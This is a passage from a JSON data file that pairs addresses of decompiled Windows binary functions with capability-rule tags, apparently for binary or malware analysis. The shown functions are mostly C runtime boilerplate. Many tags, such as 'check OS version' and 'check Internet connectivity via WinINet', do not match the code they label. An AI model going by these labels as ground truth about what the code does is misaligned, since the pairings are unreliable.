 *0x4efd84 = unaff_EBP;\n    *0x4efd88 = unaff_retaddr;\n    *0x4efd8c = in_CS;\n    *0x4efd98 = in_SS;\n    *0x4efcc8 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.00409907(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x402b80);\n    if (*0x4efcc8 == 0) {\n        fcn.00409907(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 838
    },
    "00408a95": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x00408b9b: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x00408ba0)\n// WARNING: Removing unreachable block (ram,0x00408bcf)\n// WARNING: Removing unreachable block (ram,0x00408ba6)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00408a95(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t unaff_EBP;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.004055b0(0x4e56c8, 0x20);\n    fcn.004098d4(8);\n    *(unaff_EBP + -4) = 0;\n    pcVar1 = _sym.imp.KERNEL32.dll_DecodePointer;\n    if (*0x4ef3c4 != 1) {\n        *0x4ef3c0 = 1;\n        *0x4ef3bc = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar2 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x4f67b8);\n            *(unaff_EBP + -0x30) = piVar2;\n            if (piVar2 != NULL) {\n                piVar3 = (*pcVar1)(*0x4f67b4);\n                *(unaff_EBP + -0x2c) = piVar3;\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x28) = piVar3;\n                while( true ) {\n                    piVar3 = piVar3 + -1;\n                    *(unaff_EBP + -0x2c) = piVar3;\n                    if (piVar3 < piVar2) break;\n                    iVar4 = fcn.004078a7();\n                    if (*piVar3 != iVar4) {\n                        if (piVar3 < piVar2) break;\n                        pcVar5 = (*pcVar1)(*piVar3);\n                        iVar4 = fcn.004078a7();\n                        *piVar3 = iVar4;\n                        (*pcVar5)();\n                        iVar4 = (*pcVar1)(*0x4f67b8);\n                        piVar2 = (*pcVar1)(*0x4f67b4);\n                        if ((*(unaff_EBP + -0x24) != iVar4) || (*(unaff_EBP + -0x28) != piVar2)) {\n                            *(unaff_EBP + -0x24) = iVar4;\n                            *(unaff_EBP + -0x30) = iVar4;\n                            *(unaff_EBP + -0x28) = piVar2;\n                            *(unaff_EBP + -0x2c) = piVar2;\n                            piVar3 = piVar2;\n                        }\n                        piVar2 = *(unaff_EBP + -0x30);\n                    }\n                }\n            }\n            *(unaff_EBP + -0x1c) = 0x40118c;\n            while (*(unaff_EBP + -0x1c) < 0x401198) {\n                if (**(unaff_EBP + -0x1c) != NULL) {\n                    (***(unaff_EBP + -0x1c))();\n                }\n                *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 4;\n            }\n        }\n        *(unaff_EBP + -0x20) = 0x40119c;\n        while (*(unaff_EBP + -0x20) < 0x4011a0) {\n            if (**(unaff_EBP + -0x20) != NULL) {\n                (***(unaff_EBP + -0x20))();\n            }\n            *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + 4;\n        }\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.004097fb(8);\n    }\n    return;\n}\n",
        "token_count": 1030
    },
    "0040b266": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n\nvoid __cdecl fcn.0040b266(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    bool bVar6;\n    int32_t iVar7;\n    uint8_t uVar8;\n    uint32_t *puVar9;\n    uint *puVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    uint32_t uVar15;\n    int32_t iVar16;\n    bool bVar17;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4e7430 ^ &stack0xfffffffc;\n    uVar2 = arg_8h[5];\n    uVar15 = *(arg_8h + 3);\n    var_10h = uVar15;\n    uVar4 = *(arg_8h + 1);\n    uVar3 = *arg_8h;\n    uVar12 = uVar2 & 0x7fff;\n    iVar13 = uVar12 - 0x3fff;\n    var_ch = uVar4;\n    var_8h = uVar3 << 0x10;\n    uVar5 = str.5_v_[1];\n    if (iVar13 == -0x3fff) {\n        iVar14 = 0;\n        iVar13 = 0;\n        do {\n            if ((&var_10h)[iVar13] != 0) {\n                var_10h = 0;\n                var_ch = 0;\n                var_8h = 0;\n                break;\n            }\n            iVar13 = iVar13 + 1;\n        } while (iVar13 < 3);\n    }\n    else {\n        bVar6 = false;\n        iVar16 = str.5_v_[0] + L'\\xffffffff';\n        iVar14 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n        puVar1 = &var_10h + iVar14;\n        uVar8 = 0x1f - (str.5_v_[0] & 0x1f);\n        if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n            uVar11 = (&var_10h)[iVar14] & ~(-1 << (uVar8 & 0x1f));\n            iVar7 = iVar14;\n            while( true ) {\n                if (uVar11 != 0) {\n                    iVar7 = iVar16 + (iVar16 >> 0x1f & 0x1fU) >> 5;\n                    uVar11 = 1 << (0x1f - (iVar16 & 0x1f) & 0x1f);\n                    puVar9 = &var_10h + iVar7;\n                    var_20h = *puVar9 + uVar11;\n                    if (var_20h < *puVar9) goto code_r0x0040b3aa;\n                    bVar17 = var_20h < uVar11;\n                    do {\n                        bVar6 = false;\n                        if (!bVar17) goto code_r0x0040b3b1;\ncode_r0x0040b3aa:\n                        do {\n                            bVar6 = true;\ncode_r0x0040b3b1:\n                            iVar7 = iVar7 + -1;\n                            *puVar9 = var_20h;\n                            if ((iVar7 < 0) || (!bVar6)) goto code_r0x0040b3bf;\n                            puVar9 = &var_10h + iVar7;\n                            var_20h = *puVar9 + 1;\n                        } while (var_20h < *puVar9);\n                        bVar17 = var_20h == 0;\n                    } while( true );\n                }\n                iVar7 = iVar7 + 1;\n                if (2 < iVar7) break;\n                uVar11 = (&var_10h)[iVar7];\n            }\n        }\ncode_r0x0040b3bf:\n        *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n        iVar14 = iVar14 + 1;\n        if (iVar14 < 3) {\n            puVar10 = &var_10h + iVar14;\n            for (iVar16 = 3 - iVar14; iVar16 != 0; iVar16 = iVar16 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n        }\n        iVar14 = iVar13;\n        if (bVar6) {\n            iVar14 = uVar12 - 0x3ffe;\n        }\n        if (iVar14 < *0x4e7f28 - str.5_v_[0]) {\n            var_10h = 0;\n            var_ch = 0;\n            var_8h = 0;\n        }\n        else {\n            if (*0x4e7f28 < iVar14) {\n                if (iVar14 < *0x4e7f24) {\n                    iVar14 = iVar14 + str.5_v_[3];\n                    var_10h = var_10h & 0x7fffffff;\n                    iVar13 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar16 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar16 < iVar13) {\n                            (&var_10h)[iVar16] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar16] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar16 = iVar16 + -1;\n                    } while (-1 < iVar16);\n                }\n                else {\n                    var_ch = 0;\n                    var_8h = 0;\n                    var_10h = 0x80000000;\n                    iVar13 = str.5_v_[1] + (str.5_v_[1] >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar14 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar14 < iVar13) {\n                            (&var_10h)[iVar14] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar14] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar14 = iVar14 + -1;\n                    } while (-1 < iVar14);\n                    iVar14 = str.5_v_[3] + *0x4e7f24;\n                }\n                goto code_r0x0040b76a;\n            }\n            iVar13 = *0x4e7f28 - iVar13;\n            var_10h = uVar15;\n            var_ch = uVar4;\n            iVar14 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = iVar13 & 0x1f;\n            var_8h = uVar3 << 0x10;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar13 = 2;\n            puVar10 = &var_8h + -iVar14;\n            do {\n                if (iVar13 < iVar14) {\n                    (&var_10h)[iVar13] = 0;\n                }\n                else {\n                    (&var_10h)[iVar13] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar13 = iVar13 + -1;\n            } while (-1 < iVar13);\n            iVar14 = str.5_v_[0] + L'\\xffffffff';\n            iVar13 = str.5_v_[0] + (str.5_v_[0] >> 0x1f & 0x1fU) >> 5;\n            uVar8 = 0x1f - (str.5_v_[0] & 0x1f);\n            puVar1 = &var_10h + iVar13;\n            if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n                uVar15 = (&var_10h)[iVar13] & ~(-1 << (uVar8 & 0x1f));\n                iVar16 = iVar13;\n                while (uVar15 == 0) {\n                    iVar16 = iVar16 + 1;\n                    if (2 < iVar16) goto code_r0x0040b55e;\n                    uVar15 = (&var_10h)[iVar16];\n                }\n                iVar16 = iVar14 + (iVar14 >> 0x1f & 0x1fU) >> 5;\n                bVar6 = false;\n                uVar12 = 1 << (0x1f - (iVar14 & 0x1f) & 0x1f);\n                uVar4 = (&var_10h)[iVar16];\n                uVar15 = uVar4 + uVar12;\n                if ((uVar15 < uVar4) || (uVar15 < uVar12)) {\n                    bVar6 = true;\n                }\n                (&var_10h)[iVar16] = uVar15;\n                while ((iVar16 = iVar16 + -1,  -1 < iVar16 && (bVar6))) {\n                    uVar4 = (&var_10h)[iVar16];\n                    uVar15 = uVar4 + 1;\n                    bVar6 = false;\n                    if ((uVar15 < uVar4) || (uVar15 == 0)) {\n                        bVar6 = true;\n                    }\n                    (&var_10h)[iVar16] = uVar15;\n                }\n            }\ncode_r0x0040b55e:\n            *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n            iVar13 = iVar13 + 1;\n            if (iVar13 < 3) {\n                puVar10 = &var_10h + iVar13;\n                for (iVar14 = 3 - iVar13; iVar14 != 0; iVar14 = iVar14 + -1) {\n                    *puVar10 = 0;\n                    puVar10 = puVar10 + 1;\n                }\n            }\n            iVar13 = str.5_v_[1] + L'\\x01' + (str.5_v_[1] + L'\\x01' >> 0x1f & 0x1fU) >> 5;\n            uVar8 = uVar5 + 1 & 0x1f;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar14 = 2;\n            puVar10 = &var_8h + -iVar13;\n            do {\n                if (iVar14 < iVar13) {\n                    (&var_10h)[iVar14] = 0;\n                }\n                else {\n                    (&var_10h)[iVar14] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar14 = iVar14 + -1;\n            } while (-1 < iVar14);\n        }\n        iVar14 = 0;\n    }\ncode_r0x0040b76a:\n    uVar15 = iVar14 << (0x1f - uVar5 & 0x1f) | -((uVar2 & 0x8000) != 0) & 0x80000000 | var_10h;\n    if (str.5_v_[2] == L'@') {\n        arg_ch[1] = uVar15;\n        *arg_ch = var_ch;\n    }\n    else if (str.5_v_[2] == L' ') {\n        *arg_ch = uVar15;\n    }\n    fcn.00407ef3(uVar2 & 0x8000);\n    return;\n}\n",
        "token_count": 3284
    },
    "0040b7b7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_38h\n\nvoid __cdecl fcn.0040b7b7(uint16_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    uint8_t uVar5;\n    bool bVar6;\n    int32_t iVar7;\n    uint8_t uVar8;\n    uint32_t *puVar9;\n    uint *puVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    int32_t iVar14;\n    uint32_t uVar15;\n    int32_t iVar16;\n    bool bVar17;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4e7430 ^ &stack0xfffffffc;\n    uVar2 = arg_8h[5];\n    uVar15 = *(arg_8h + 3);\n    var_10h = uVar15;\n    uVar4 = *(arg_8h + 1);\n    uVar3 = *arg_8h;\n    uVar12 = uVar2 & 0x7fff;\n    iVar13 = uVar12 - 0x3fff;\n    var_ch = uVar4;\n    var_8h = uVar3 << 0x10;\n    uVar5 = *0x4e7f48;\n    if (iVar13 == -0x3fff) {\n        iVar14 = 0;\n        iVar13 = 0;\n        do {\n            if ((&var_10h)[iVar13] != 0) {\n                var_10h = 0;\n                var_ch = 0;\n                var_8h = 0;\n                break;\n            }\n            iVar13 = iVar13 + 1;\n        } while (iVar13 < 3);\n    }\n    else {\n        bVar6 = false;\n        iVar16 = *0x4e7f44 + -1;\n        iVar14 = *0x4e7f44 + (*0x4e7f44 >> 0x1f & 0x1fU) >> 5;\n        puVar1 = &var_10h + iVar14;\n        uVar8 = 0x1f - (*0x4e7f44 & 0x1f);\n        if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n            uVar11 = (&var_10h)[iVar14] & ~(-1 << (uVar8 & 0x1f));\n            iVar7 = iVar14;\n            while( true ) {\n                if (uVar11 != 0) {\n                    iVar7 = iVar16 + (iVar16 >> 0x1f & 0x1fU) >> 5;\n                    uVar11 = 1 << (0x1f - (iVar16 & 0x1f) & 0x1f);\n                    puVar9 = &var_10h + iVar7;\n                    var_20h = *puVar9 + uVar11;\n                    if (var_20h < *puVar9) goto code_r0x0040b8fb;\n                    bVar17 = var_20h < uVar11;\n                    do {\n                        bVar6 = false;\n                        if (!bVar17) goto code_r0x0040b902;\ncode_r0x0040b8fb:\n                        do {\n                            bVar6 = true;\ncode_r0x0040b902:\n                            iVar7 = iVar7 + -1;\n                            *puVar9 = var_20h;\n                            if ((iVar7 < 0) || (!bVar6)) goto code_r0x0040b910;\n                            puVar9 = &var_10h + iVar7;\n                            var_20h = *puVar9 + 1;\n                        } while (var_20h < *puVar9);\n                        bVar17 = var_20h == 0;\n                    } while( true );\n                }\n                iVar7 = iVar7 + 1;\n                if (2 < iVar7) break;\n                uVar11 = (&var_10h)[iVar7];\n            }\n        }\ncode_r0x0040b910:\n        *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n        iVar14 = iVar14 + 1;\n        if (iVar14 < 3) {\n            puVar10 = &var_10h + iVar14;\n            for (iVar16 = 3 - iVar14; iVar16 != 0; iVar16 = iVar16 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n        }\n        iVar14 = iVar13;\n        if (bVar6) {\n            iVar14 = uVar12 - 0x3ffe;\n        }\n        if (iVar14 < *0x4e7f40 - *0x4e7f44) {\n            var_10h = 0;\n            var_ch = 0;\n            var_8h = 0;\n        }\n        else {\n            if (*0x4e7f40 < iVar14) {\n                if (iVar14 < *0x4e7f3c) {\n                    iVar14 = iVar14 + *0x4e7f50;\n                    var_10h = var_10h & 0x7fffffff;\n                    iVar13 = *0x4e7f48 + (*0x4e7f48 >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar16 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar16 < iVar13) {\n                            (&var_10h)[iVar16] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar16] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar16 = iVar16 + -1;\n                    } while (-1 < iVar16);\n                }\n                else {\n                    var_ch = 0;\n                    var_8h = 0;\n                    var_10h = 0x80000000;\n                    iVar13 = *0x4e7f48 + (*0x4e7f48 >> 0x1f & 0x1fU) >> 5;\n                    uVar8 = uVar5 & 0x1f;\n                    var_28h = 0;\n                    var_20h = 0;\n                    do {\n                        uVar15 = (&var_10h)[var_20h];\n                        (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                        var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                        var_20h = var_20h + 1;\n                    } while (var_20h < 3);\n                    iVar14 = 2;\n                    puVar10 = &var_8h + -iVar13;\n                    do {\n                        if (iVar14 < iVar13) {\n                            (&var_10h)[iVar14] = 0;\n                        }\n                        else {\n                            (&var_10h)[iVar14] = *puVar10;\n                        }\n                        puVar10 = puVar10 + -1;\n                        iVar14 = iVar14 + -1;\n                    } while (-1 < iVar14);\n                    iVar14 = *0x4e7f50 + *0x4e7f3c;\n                }\n                goto code_r0x0040bcbb;\n            }\n            iVar13 = *0x4e7f40 - iVar13;\n            var_10h = uVar15;\n            var_ch = uVar4;\n            iVar14 = iVar13 + (iVar13 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = iVar13 & 0x1f;\n            var_8h = uVar3 << 0x10;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar13 = 2;\n            puVar10 = &var_8h + -iVar14;\n            do {\n                if (iVar13 < iVar14) {\n                    (&var_10h)[iVar13] = 0;\n                }\n                else {\n                    (&var_10h)[iVar13] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar13 = iVar13 + -1;\n            } while (-1 < iVar13);\n            iVar14 = *0x4e7f44 + -1;\n            iVar13 = *0x4e7f44 + (*0x4e7f44 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = 0x1f - (*0x4e7f44 & 0x1f);\n            puVar1 = &var_10h + iVar13;\n            if ((*puVar1 & 1 << (uVar8 & 0x1f)) != 0) {\n                uVar15 = (&var_10h)[iVar13] & ~(-1 << (uVar8 & 0x1f));\n                iVar16 = iVar13;\n                while (uVar15 == 0) {\n                    iVar16 = iVar16 + 1;\n                    if (2 < iVar16) goto code_r0x0040baaf;\n                    uVar15 = (&var_10h)[iVar16];\n                }\n                iVar16 = iVar14 + (iVar14 >> 0x1f & 0x1fU) >> 5;\n                bVar6 = false;\n                uVar12 = 1 << (0x1f - (iVar14 & 0x1f) & 0x1f);\n                uVar4 = (&var_10h)[iVar16];\n                uVar15 = uVar4 + uVar12;\n                if ((uVar15 < uVar4) || (uVar15 < uVar12)) {\n                    bVar6 = true;\n                }\n                (&var_10h)[iVar16] = uVar15;\n                while ((iVar16 = iVar16 + -1,  -1 < iVar16 && (bVar6))) {\n                    uVar4 = (&var_10h)[iVar16];\n                    uVar15 = uVar4 + 1;\n                    bVar6 = false;\n                    if ((uVar15 < uVar4) || (uVar15 == 0)) {\n                        bVar6 = true;\n                    }\n                    (&var_10h)[iVar16] = uVar15;\n                }\n            }\ncode_r0x0040baaf:\n            *puVar1 = *puVar1 & -1 << (uVar8 & 0x1f);\n            iVar13 = iVar13 + 1;\n            if (iVar13 < 3) {\n                puVar10 = &var_10h + iVar13;\n                for (iVar14 = 3 - iVar13; iVar14 != 0; iVar14 = iVar14 + -1) {\n                    *puVar10 = 0;\n                    puVar10 = puVar10 + 1;\n                }\n            }\n            iVar13 = *0x4e7f48 + 1 + (*0x4e7f48 + 1 >> 0x1f & 0x1fU) >> 5;\n            uVar8 = uVar5 + 1 & 0x1f;\n            var_28h = 0;\n            var_20h = 0;\n            do {\n                uVar15 = (&var_10h)[var_20h];\n                (&var_10h)[var_20h] = uVar15 >> uVar8 | var_28h;\n                var_28h = (uVar15 & ~(-1 << uVar8)) << (0x20 - uVar8 & 0x1f);\n                var_20h = var_20h + 1;\n            } while (var_20h < 3);\n            iVar14 = 2;\n            puVar10 = &var_8h + -iVar13;\n            do {\n                if (iVar14 < iVar13) {\n                    (&var_10h)[iVar14] = 0;\n                }\n                else {\n                    (&var_10h)[iVar14] = *puVar10;\n                }\n                puVar10 = puVar10 + -1;\n                iVar14 = iVar14 + -1;\n            } while (-1 < iVar14);\n        }\n        iVar14 = 0;\n    }\ncode_r0x0040bcbb:\n    uVar15 = iVar14 << (0x1f - uVar5 & 0x1f) | -((uVar2 & 0x8000) != 0) & 0x80000000 | var_10h;\n    if (*0x4e7f4c == 0x40) {\n        arg_ch[1] = uVar15;\n        *arg_ch = var_ch;\n    }\n    else if (*0x4e7f4c == 0x20) {\n        *arg_ch = uVar15;\n    }\n    fcn.00407ef3(uVar2 & 0x8000);\n    return;\n}\n",
        "token_count": 3289
    },
    "0040d759": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0040d759(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.004097fb(0);\n    }\n    return;\n}\n",
        "token_count": 64
    },
    "0040d8ed": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040d8ed(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    code *pcVar6;\n    uint unaff_EBX;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4e7430 ^ &stack0xfffffffc;\n    var_20h = arg_8h;\n    var_1ch = arg_ch;\n    var_18h = fcn.004078a7();\n    var_14h = 0;\n    if (*0x4effbc == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(0x402bec);\n        pcVar6 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if ((iVar1 == 0) ||\n           (iVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, 0x402be0), \n           pcVar4 = _sym.imp.KERNEL32.dll_EncodePointer,  iVar2 == 0)) goto code_r0x0040da4a;\n        *0x4effbc = (*_sym.imp.KERNEL32.dll_EncodePointer)(iVar2);\n        uVar3 = (*pcVar6)(iVar1, 0x402bd0);\n        *0x4effc0 = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, 0x402bbc);\n        *0x4effc4 = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, 0x402ba0);\n        *0x4effcc = (*pcVar4)(uVar3);\n        if (*0x4effcc != 0) {\n            uVar3 = (*pcVar6)(iVar1, 0x402b88);\n            *0x4effc8 = (*pcVar4)(uVar3);\n        }\n    }\n    pcVar6 = _sym.imp.KERNEL32.dll_DecodePointer;\n    if ((*0x4effc8 == var_18h) || (*0x4effcc == var_18h)) {\ncode_r0x0040d9f9:\n        if ((((*0x4effc0 != var_18h) && (pcVar4 = (*pcVar6)(*0x4effc0),  pcVar4 != NULL)) &&\n            (var_14h = (*pcVar4)(),  var_14h != 0)) &&\n           ((*0x4effc4 != var_18h && (pcVar4 = (*pcVar6)(*0x4effc4),  pcVar4 != NULL)))) {\n            var_14h = (*pcVar4)(var_14h);\n        }\n    }\n    else {\n        pcVar4 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x4effc8);\n        pcVar5 = (*pcVar6)(*0x4effcc);\n        if (((pcVar4 == NULL) || (pcVar5 == NULL)) ||\n           (((iVar1 = (*pcVar4)(),  iVar1 != 0 && (iVar1 = (*pcVar5)(iVar1, 1, &var_10h, 0xc, &var_24h),  iVar1 != 0))\n            && ((var_8h & 1) != 0)))) goto code_r0x0040d9f9;\n        arg_10h = arg_10h | 0x200000;\n    }\n    pcVar6 = (*pcVar6)(*0x4effbc);\n    if (pcVar6 != NULL) {\n        (*pcVar6)(var_14h, var_20h, var_1ch, arg_10h);\n    }\ncode_r0x0040da4a:\n    fcn.00407ef3(unaff_EBX);\n    return;\n}\n",
        "token_count": 949
    },
    "0040e60d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040e60d(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint unaff_EBX;\n    uint var_28h;\n    uint var_24h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4e7430 ^ &stack0xfffffffc;\n    fcn.00404ba7(arg_10h);\n    var_14h = fcn.00407f02(&var_10h, &var_28h, arg_ch, 0, 0, 0, 0, &var_24h);\n    iVar1 = fcn.0040b266(&var_10h, arg_8h);\n    if ((var_14h & 3) == 0) {\n        if (iVar1 == 1) {\ncode_r0x0040e666:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040e6a6;\n        }\n        if (iVar1 != 2) {\ncode_r0x0040e698:\n            if (var_18h != '\\0') {\n                *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x0040e6a6;\n        }\n    }\n    else if ((var_14h & 1) == 0) {\n        if ((var_14h & 2) == 0) goto code_r0x0040e698;\n        goto code_r0x0040e666;\n    }\n    if (var_18h != '\\0') {\n        *(var_1ch + 0x70) = *(var_1ch + 0x70) & 0xfffffffd;\n    }\ncode_r0x0040e6a6:\n    fcn.00407ef3(unaff_EBX);\n    return;\n}\n",
        "token_count": 511
    },
    "0040e6b5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
